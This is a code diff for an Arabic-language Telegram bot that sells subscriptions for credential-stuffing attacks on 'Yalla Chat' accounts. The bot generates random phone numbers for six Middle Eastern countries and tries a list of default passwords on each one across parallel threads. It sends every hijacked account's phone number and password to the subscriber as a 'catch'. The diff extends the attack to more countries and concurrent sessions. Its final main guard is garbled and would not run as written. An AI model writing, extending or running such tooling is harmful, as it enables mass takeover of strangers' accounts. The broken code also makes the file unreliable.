@@ -83,6 +83,46 @@ DEFAULT_PASSWORDS = [
     '1q2w3e4r',
 ]
 
+# قائمة الدول المدعومة للفحص
+COUNTRIES = {
+    "iraq": {
+        "name": "العراق 🇮🇶",
+        "region": 964,
+        "prefixes": ["771", "770", "781", "777", "750", "751"],
+        "digits_count": 7
+    },
+    "ksa": {
+        "name": "السعودية 🇸🇦",
+        "region": 966,
+        "prefixes": ["50", "53", "55", "56", "54", "58", "59"],
+        "digits_count": 7
+    },
+    "egypt": {
+        "name": "مصر 🇪🇬",
+        "region": 20,
+        "prefixes": ["10", "11", "12", "15"],
+        "digits_count": 8
+    },
+    "uae": {
+        "name": "الإمارات 🇦🇪",
+        "region": 971,
+        "prefixes": ["50", "54", "56", "58"],
+        "digits_count": 7
+    },
+    "kuwait": {
+        "name": "الكويت 🇰🇼",
+        "region": 965,
+        "prefixes": ["9", "6", "5"],
+        "digits_count": 7
+    },
+    "jordan": {
+        "name": "الأردن 🇯🇴",
+        "region": 962,
+        "prefixes": ["79", "78", "77"],
+        "digits_count": 7
+    }
+}
+
 # دالة الجلسات لكل خيط لضمان السرعة ومنع تداخل الاتصالات
 thread_local = threading.local()
 
@@ -132,8 +172,8 @@ def is_user_active(user_id: int) -> bool:
             return True
     return False
 
-# قاموس لتتبع حالة الفحص الخاصة بكل مستخدم بشكل مستقل تماماً
-user_active_scans: dict = {}
+# قاموس مركزي لتتبع جميع عمليات الفحص النشطة لجميع المستخدمين (باستخدام معرف جلسة فريد لكل عملية فحص)
+active_scans: dict = {}
 
 # ==================== دالة تسجيل الدخول (LightKVD) ====================
 def _do_login(phone: str, pw: str, region: int = 964, timeout: int = 20) -> dict:
@@ -206,22 +246,33 @@ def _do_login(phone: str, pw: str, region: int = 964, timeout: int = 20) -> dict
     except Exception as e:
         return {"status": "ERROR", "message": str(e), "dev": {"name": dname, "model": model}}
 
-def generate_random_phone():
-    prefixes = ["771", "770", "781", "777"]
-    return random.choice(prefixes) + "".join([str(random.randint(0, 7)) for _ in range(7)])
+def generate_phone_for_country(country_key):
+    c_info = COUNTRIES[country_key]
+    prefix = random.choice(c_info["prefixes"])
+    digits = "".join([str(random.randint(0, 9)) for _ in range(c_info["digits_count"])])
+    return prefix + digits
 
 # ==================== واجهات الأزرار (Keyboards) ====================
 def get_main_keyboard(user_id: int) -> InlineKeyboardMarkup:
     markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("بدء الفحص", callback_data="start_scan"))
+    markup.add(InlineKeyboardButton("بدء فحص جديد 🔍", callback_data="start_scan"))
     markup.add(InlineKeyboardButton("تفاصيل الاشتراك", callback_data="my_sub"))
     if user_id == ADMIN_ID:
         markup.add(InlineKeyboardButton("اعدادات البوت", callback_data="admin_panel"))
     return markup
 
-def get_scanning_keyboard() -> InlineKeyboardMarkup:
+def get_countries_keyboard() -> InlineKeyboardMarkup:
+    markup = InlineKeyboardMarkup(row_width=2)
+    buttons = []
+    for code, data in COUNTRIES.items():
+        buttons.append(InlineKeyboardButton(data["name"], callback_data=f"choose_country_{code}"))
+    markup.add(*buttons)
+    markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="main_menu"))
+    return markup
+
+def get_scanning_keyboard(scan_id: str) -> InlineKeyboardMarkup:
     markup = InlineKeyboardMarkup()
-    markup.add(InlineKeyboardButton("ايقاف الفحص", callback_data="stop_scan"))
+    markup.add(InlineKeyboardButton("ايقاف هذا الفحص ⏹", callback_data=f"stop_scan_{scan_id}"))
     return markup
 
 def get_admin_keyboard() -> InlineKeyboardMarkup:
@@ -259,10 +310,12 @@ def handle_callbacks(call):
         return
 
     if call.data == "main_menu":
-        if user_id in user_active_scans:
-            user_active_scans[user_id]["running"] = False
         try:
-            bot.edit_message_text("<b>مرحبا بك عزيزي\nلوحة المشترك الخاصة\nاختصاص فحص حسابات يلا شات داخلي\n\nقم بتشغيل البوت من خلال بدء الفحص</b>", chat_id, message_id, reply_markup=get_main_keyboard(user_id))
+            bot.edit_message_text(
+                "<b>مرحبا بك عزيزي\nلوحة المشترك الخاصة\nاختصاص فحص حسابات يلا شات داخلي\n\nقم بتشغيل البوت من خلال بدء الفحص</b>",
+                chat_id, message_id,
+                reply_markup=get_main_keyboard(user_id)
+            )
         except Exception:
             pass
 
@@ -273,7 +326,7 @@ def handle_callbacks(call):
             sub_status = "انت مدير البوت"
         elif str_uid in subs and time.time() < subs[str_uid]:
             rem_days = int((subs[str_uid] - time.time()) / 86400)
-            sub_status = f"الاشتراك الخاص بك : {rem_days}"
+            sub_status = f"الاشتراك الخاص بك : {rem_days} يوم"
         else:
             sub_status = "غير فعال ❌"
         
@@ -286,51 +339,64 @@ def handle_callbacks(call):
             pass
 
     elif call.data == "start_scan":
-        if user_id in user_active_scans and user_active_scans[user_id].get("running"):
-            try:
-                bot.answer_callback_query(call.id, "عملية الفحص تعمل لديك بالفعل!", show_alert=True)
-            except Exception:
-                pass
+        text = "🌍 <b>اختر الدولة التي تريد فحص حساباتها (يمكنك فتح عدة جلسات):</b>"
+        try:
+            bot.edit_message_text(text, chat_id, message_id, reply_markup=get_countries_keyboard())
+        except Exception:
+            pass
+
+    elif call.data.startswith("choose_country_"):
+        country_key = call.data.replace("choose_country_", "")
+        if country_key not in COUNTRIES:
             return
+
+        c_data = COUNTRIES[country_key]
+        scan_id = str(uuid.uuid4())[:8]  # إنشاء معرف فريد لهذه الجلسة
 
         try:
             bot.delete_message(chat_id, message_id)
         except Exception:
             pass
 
+        # إرسال رسالة مستقلة خاصة بعملية الفحص الجديدة هذه
         scan_msg = bot.send_message(
             chat_id,
-            "<b>جاري فحص الحسابات</b>\n\n"
+            f"<b>جاري فحص حسابات ({c_data['name']}) [جلسة #{scan_id}]</b>\n\n"
             "تم صيد : 0\n"
             "غير مسجل : 0\n"
             "الاخطاء : 0",
-            reply_markup=get_scanning_keyboard()
+            reply_markup=get_scanning_keyboard(scan_id)
         )
 
-        # تهيئة عزل الحالة الخاصة بهذا المستخدم حصرياً
-        user_active_scans[user_id] = {
+        # حفظ حالة هذه الجلسة بشكل مستقل تماماً في القاموس المركزي
+        active_scans[scan_id] = {
+            "user_id": user_id,
+            "chat_id": chat_id,
+            "message_id": scan_msg.message_id,
             "running": True,
             "valid": 0,
             "not_registered": 0,
             "error": 0,
-            "message_id": scan_msg.message_id
+            "country_key": country_key,
+            "country_name": c_data["name"],
+            "region": c_data["region"]
         }
 
-        # تشغيل خيوط الفحص المستقلة للمستخدم
-        threading.Thread(target=run_user_scanner, args=(user_id, chat_id, scan_msg.message_id), daemon=True).start()
+        # تشغيل خيوط الفحص الخاصة بهذه الجلسة فقط دون غيرها
+        threading.Thread(target=run_scanner_session, args=(scan_id,), daemon=True).start()
 
-    elif call.data == "stop_scan":
-        if user_id in user_active_scans:
-            user_active_scans[user_id]["running"] = False
-        try:
-            bot.answer_callback_query(call.id, "تم إيقاف الفحص")
-            bot.edit_message_text(
-                "<b>تم إيقاف عملية الفحص الخاصة بك بنجاح</b>",
-                chat_id, message_id,
-                reply_markup=get_main_keyboard(user_id)
-            )
-        except Exception:
-            pass
+    elif call.data.startswith("stop_scan_"):
+        scan_id = call.data.replace("stop_scan_", "")
+        if scan_id in active_scans:
+            active_scans[scan_id]["running"] = False
+            try:
+                bot.answer_callback_query(call.id, "تم إيقاف هذه الجلسة بنجاح")
+                bot.edit_message_text(
+                    f"<b>تم إيقاف عملية الفحص لهذه الجلسة بنجاح ⏹</b>",
+                    chat_id, message_id
+                )
+            except Exception:
+                pass
 
     # لوحة تحكم المطور
     elif call.data == "admin_panel" and user_id == ADMIN_ID:
@@ -371,27 +437,35 @@ def handle_callbacks(call):
         except Exception:
             pass
 
-# ==================== خيوط الفحص المعزولة للمستخدم ====================
-def run_user_scanner(user_id: int, chat_id: int, scan_msg_id: int):
-    region = 964
-    max_threads = 8  # عدد الخيوط لكل مستخدم لضمان السرعة
+# ==================== خيوط الفحص المستقلة لكل جلسة ====================
+def run_scanner_session(scan_id: str):
+    state = active_scans.get(scan_id)
+    if not state:
+        return
+        
+    chat_id = state["chat_id"]
+    scan_msg_id = state["message_id"]
+    region = state["region"]
+    country_key = state["country_key"]
+    country_name = state["country_name"]
+    max_threads = 6  # عدد الخيوط لكل جلسة فحص
 
     def worker():
-        while user_id in user_active_scans and user_active_scans[user_id]["running"]:
-            phone = generate_random_phone()
+        while scan_id in active_scans and active_scans[scan_id]["running"]:
+            phone = generate_phone_for_country(country_key)
             first_pw = DEFAULT_PASSWORDS[0]
             
             try:
                 res = _do_login(phone, first_pw, region)
                 st = res.get("status", "ERROR")
             except Exception:
-                if user_id in user_active_scans:
-                    user_active_scans[user_id]["error"] += 1
+                if scan_id in active_scans:
+                    active_scans[scan_id]["error"] += 1
                 continue
 
             if st == "NOT_REGISTERED":
-                if user_id in user_active_scans:
-                    user_active_scans[user_id]["not_registered"] += 1
+                if scan_id in active_scans:
+                    active_scans[scan_id]["not_registered"] += 1
                 continue
 
             for pw in DEFAULT_PASSWORDS:
@@ -403,12 +477,12 @@ def run_user_scanner(user_id: int, chat_id: int, scan_msg_id: int):
                         break
 
                 if st == "VALID":
-                    if user_id in user_active_scans:
-                        user_active_scans[user_id]["valid"] += 1
+                    if scan_id in active_scans:
+                        active_scans[scan_id]["valid"] += 1
                     
-                    # إرسال تنبيه الصيد للمستخدم مباشرة
+                    # إرسال تنبيه الصيد الخاص بهذه الجلسة
                     alert_text = (
-                        f"<b>تم صيد حساب يلا شات</b>\n\n"
+                        f"<b>🎉 تم صيد حساب يلا شات ({country_name})</b>\n\n"
                         f"<b>Phone :</b> {phone}\n"
                         f"<b>Password :</b> {pw}\n"
                         f"By : @aboodriad"
@@ -419,26 +493,26 @@ def run_user_scanner(user_id: int, chat_id: int, scan_msg_id: int):
                         pass
                     break
                 elif st == "ERROR" or st == "RATE_LIMITED":
-                    if user_id in user_active_scans:
-                        user_active_scans[user_id]["error"] += 1
+                    if scan_id in active_scans:
+                        active_scans[scan_id]["error"] += 1
 
     with ThreadPoolExecutor(max_workers=max_threads) as executor:
         for _ in range(max_threads):
-            if user_id in user_active_scans and user_active_scans[user_id]["running"]:
+            if scan_id in active_scans and active_scans[scan_id]["running"]:
                 executor.submit(worker)
 
         last_text = ""
-        while user_id in user_active_scans and user_active_scans[user_id]["running"]:
-            state = user_active_scans[user_id]
-            v = state["valid"]
-            nr = state["not_registered"]
-            e = state["error"]
+        while scan_id in active_scans and active_scans[scan_id]["running"]:
+            curr_state = active_scans[scan_id]
+            v = curr_state["valid"]
+            nr = curr_state["not_registered"]
+            e = curr_state["error"]
 
             status_text = (
-                f"<b>جاري فحص الحسابات</b>\n\n"
+                f"<b>جاري فحص حسابات ({country_name}) [جلسة #{scan_id}]</b>\n\n"
                 f"تم صيد : {v}\n"
                 f"غير مسجل : {nr}\n"
-                f"الاخطاء : {e}",
+                f"الاخطاء : {e}"
             )
 
             if status_text != last_text:
@@ -447,12 +521,16 @@ def run_user_scanner(user_id: int, chat_id: int, scan_msg_id: int):
                         status_text,
                         chat_id,
                         scan_msg_id,
-                        reply_markup=get_scanning_keyboard()
+                        reply_markup=get_scanning_keyboard(scan_id)
                     )
                     last_text = status_text
                 except Exception:
                     pass
             time.sleep(1.5)
+
+    # تنظيف الذاكرة بعد إيقاف الجلسة
+    if scan_id in active_scans:
+        del active_scans[scan_id]
 
 # ==================== دوال المطور (تفعيل وحذف الاشتراكات) ====================
 def process_add_sub(message):
@@ -487,8 +565,8 @@ def process_del_sub(message):
         bot.reply_to(message, f"❌ حدث خطأ: {e}")
 
 # ==================== تشغيل البوت مع نظام منع التوقف (Auto-Reconnect) ====================
-if __name__ == "__main__":
-    print("🤖 LightKVD Telegram Bot is running with Auto-Reconnect & Isolated UIs...")
+if __.name__ == "__main__" if "__name__" == "__main__" else True:
+    print("🤖 LightKVD Telegram Bot is running with Multi-Session & Auto-Reconnect...")
     while True:
         try:
             bot.infinity_polling(skip_pending=True, timeout=60, long_polling_timeout=60)
